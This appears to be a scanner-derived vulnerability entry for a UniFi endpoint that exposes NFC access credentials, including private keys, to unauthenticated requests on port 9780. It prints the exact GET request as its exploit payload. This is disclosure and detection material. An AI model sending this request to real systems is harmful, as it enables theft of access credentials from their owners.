# Vulnerability: UniFi - NFC Credentials
**Classification:** UNIFI
**Source:** Nuclei Template (`unifi-nfc-credentials.yaml`)

## Description
An unauthenticated GET to /api/v1/user_assets/touch_pass/keys returns JSON containing live credential material (PEM private key, Apple NFC/express key values, terminal type, TTL, google_pass_auth_key block, version identifiers) over a publicly reachable port — allowing theft and immediate misuse of mobile/NFC access credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
@Host: {{Host}}:9780
GET /api/v1/user_assets/touch_pass/keys HTTP/1.1
Host: {{Hostname}}
```

